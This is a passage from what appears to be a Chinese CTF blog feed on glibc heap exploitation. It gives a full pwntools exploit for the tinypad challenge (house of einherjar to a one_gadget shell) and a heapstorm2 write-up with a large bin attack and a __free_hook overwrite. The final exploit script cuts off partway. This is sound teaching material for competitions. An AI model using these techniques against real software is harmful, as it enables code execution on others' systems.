href="https://github.com/clxsh/ctf_wps/blob/master/others/SECON2016%20tinypad/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./tinypad&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(SIZE)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    tinypad    = <span class="number">0x602040</span></span><br><span class="line">    one_gadget = <span class="number">0x40d82</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 1: 0x30</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 2: 0x30</span></span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 3: 0x100</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 4: 0x90</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot; #   INDEX: 1\n # CONTENT: &quot;</span>)</span><br><span class="line">    heap_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_addr &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">    fake_size = heap_base + <span class="number">0x30</span> + <span class="number">0x30</span> - tinypad</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># 1: 0x100</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># 2: 0x30</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>+p64(fake_size) + <span class="string">b&quot;\n&quot;</span>)     <span class="comment"># 3: 0x30</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(tinypad)+p64(tinypad) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    delete(<span class="number">4</span>)           <span class="comment"># consolidate with top chunk, avoid malloc unsorted bin check error</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe8</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(elf.got[<span class="string">&quot;strlen&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&quot;\n&quot;</span>)     <span class="comment"># avoid free error</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">    libc_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x14CBC0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *0x4009BC&quot;)</span></span><br><span class="line">    add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">    stack_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    mainret_addr = stack_addr - <span class="number">0xf0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(mainret_addr) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    edit(<span class="number">2</span>, p64(libc_base+one_gadget) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Q&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap house_of_einherjar.c</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;house-of-einherjar&quot;&gt;&lt;a href=&quot;#house-of-einherjar&quot; class=&quot;headerlink&quot; title=&quot;house of einherjar&quot;&gt;&lt;/a&gt;house of einherjar&lt;/h2&gt;&lt;p&gt;和house of force很像，都是篡改top chunk。&lt;/p&gt;
&lt;p&gt;off-by-one覆盖victim chunk的&lt;code&gt;pre_in_use&lt;/code&gt;位，并修改&lt;code&gt;victim-&amp;gt;pre_size&lt;/code&gt;为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;victim需要临近top chunk&lt;/strong&gt;，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (__builtin_expect (chunksize_nomask (victim) &amp;lt;= &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; * SIZE_SZ, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              || __builtin_expect (chunksize_nomask (victim)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				   &amp;gt; av-&amp;gt;system_mem, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		malloc_printerr (&lt;span class=&quot;string&quot;&gt;&amp;quot;malloc(): memory corruption&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--large_bin_attack 0ctf2018--heapstorm2</title>
    <link href="http://hhdx.xyz/2020/07/18/How2heap-large-bin-attack-0ctf2018-heapstorm2/"/>
    <id>http://hhdx.xyz/2020/07/18/How2heap-large-bin-attack-0ctf2018-heapstorm2/</id>
    <published>2020-07-18T13:10:54.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-&gt;fd、bk_nextsize-&gt;fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。</p><p>这里比较难理解就是large bin的结构，特别是先前我被一个<a href="https://raw.githubusercontent.com/clxsh/pics/master/img/largebin.png">large bin结构图</a>所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png" alt="glibc large bin"></p><h2 id="0ctf2018-heapstorm2"><a href="#0ctf2018-heapstorm2" class="headerlink" title="0ctf2018 heapstorm2"></a>0ctf2018 heapstorm2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。</p><a id="more"></a><p>程序在0x13370800~0x13370818读入了0x18字节的随机数字，0x13370818复制了0x13370810处的8字节。0x13370800处的随机数用来异或模糊pointer，0x13370808处的随机数用来异或模糊size。0x13370810和0x13370818两处在view函数中用到。0x13370820后面用来存储结构体数组，结构体如下</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200719114215579.png" alt="image-20200719114215579"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; HEAP STORM II &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">1. Allocate</span><br><span class="line">2. Update</span><br><span class="line">3. Delete</span><br><span class="line">4. View</span><br><span class="line">5. Exit</span><br></pre></td></tr></table></figure><p>Allocate：分配size大小的空间，指针与大小在和随机数异或后，存储在数组中。</p><p>Update：对分配中得空间中的数据进行更新，大小只能小于等于size-12。这里存在null byte overflow</p><p>Delete：释放分配的空间，并清空结构体。</p><p>View：当<code>*(unsigned long*)0x13370810 ^ *(unsigned long*)0x13370818 = 0x13377331</code>输出空间内容，而初始时候这个位置内容一样。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>null byte overflow造成堆块重叠，large bin attack在0x13370800前面构造fake chunk，将fake_chunk链接到unsorted bin上，使用一个正好的大小分配得到此chunk，对随机数和数组进行改写，最后修改<code>__free_hook</code>获得shell。</p><h3 id="null-byte-overflow"><a href="#null-byte-overflow" class="headerlink" title="null byte overflow"></a>null byte overflow</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x400</span>)     <span class="comment"># 1</span></span><br><span class="line">allocate(<span class="number">0x28</span>)      <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0xf10</span>)     <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">3</span>, <span class="number">0xef8</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xef0</span> + p64(<span class="number">0xf00</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">0x28</span><span class="number">-12</span>, <span class="string">b&quot;A&quot;</span>*(<span class="number">0x28</span><span class="number">-12</span>))</span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 5</span></span><br><span class="line">allocate(<span class="number">0x400</span>)     <span class="comment"># 6</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 7</span></span><br><span class="line">allocate(<span class="number">0x400</span>)     <span class="comment"># 8</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>在3的内部构造后续使用的presize，释放3，溢出2覆盖3的size（0xf20-&gt;0xf00），然后分配一些块供后续使用。delete(4)后，这一大块合并入topchunk。</p><h3 id="large-bin-attack-1"><a href="#large-bin-attack-1" class="headerlink" title="large bin attack"></a>large bin attack</h3><p>null byte overflow后，unsorted bin中有：0x411-&gt;0x411-&gt;0x621。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x500</span>)     <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x500</span>)     <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x80</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0x401</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span>+<span class="number">8</span><span class="number">-0x20</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x90</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x40</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x48</span>)      <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><p>分配块3，将0x621块割裂，并将两个0x411块放入到large bin中。再分配块4，就将从topchunk中割出，出现重叠。</p><p>通过对块4进行update，将large bin中的首块（称之为victim）内容进行了更新，将它的<code>victim-&gt;size</code>修改为0x401，<code>victim-&gt;bk</code>修改为<code>0x13370800-0x20+3</code>，<code>victim-&gt;bk_nextsize</code>修改为<code>0x13370800+8-0x20</code>。之后再有更大的chunk（称之为larger）进入large bin时，就将有以下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk-&gt;fd = larger;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = larger;</span><br></pre></td></tr></table></figure><p>large bin attack之后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x133707e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133707f0:0x55fb4c70300000000x0000000000000056</span><br><span class="line">0x13370800:0x3269f037bee796f90x00005655fb4c7030</span><br></pre></td></tr></table></figure><p>这时候，0x133707f0就能够当做一个chunk的起始地址。需要随机到heap最高有效字节为0x56，因为calloc分配完成后有检查。0x56就能够满足<code>chunk_is_mmapped (mem2chunk (mem))</code>这个条件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">        av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure><h3 id="fake-unsorted-bin"><a href="#fake-unsorted-bin" class="headerlink" title="fake unsorted bin"></a>fake unsorted bin</h3><p>将unsorted bin中的某一chunk的fd、bk修改为0x133707f0，分配0x48就能将0x56的chunk分配出来。</p><p>unsorted bin从尾部往头部依次遍历，将其放入对应的bin或将其分配。从unsorted bin中取出时，有以下操作，所以得保证bk-&gt;fd是个可写的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><h3 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h3><p>改写数组，泄露heap_base地址，通过chunk中存储的bk、fd泄露libc_base，将<code>__free_hook</code>改成system地址。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/0ctf2018%20heapstorm2/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./heapstorm2&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">4</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 0</span></span><br><span class="line">    allocate(<span class="number">0x400</span>)     <span class="comment"># 1</span></span><br><span class="line">    allocate(<span class="number">0x28</span>)      <span class="comment"># 2</span></span><br><span class="line">    allocate(<span class="number">0xf10</span>)     <span class="comment"># 3</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">3</span>, <span class="number">0xef8</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xef0</span> + p64(<span class="number">0xf00</span>))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    update(<span class="number">2</span>, <span class="number">0x28</span><span class="number">-12</span>, <span class="string">b&quot;A&quot;</span>*(<span class="number">0x28</span><span class="number">-12</span>))</span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 3</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 5</span></span><br><span class="line">    allocate(<span class="number">0x400</span>)     <span class="comment"># 6</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 7</span></span><br><span class="line">    allocate(<span class="number">0x400</span>)     <span class="comment"># 8</span></span><br><span class="line">    allocate(<span 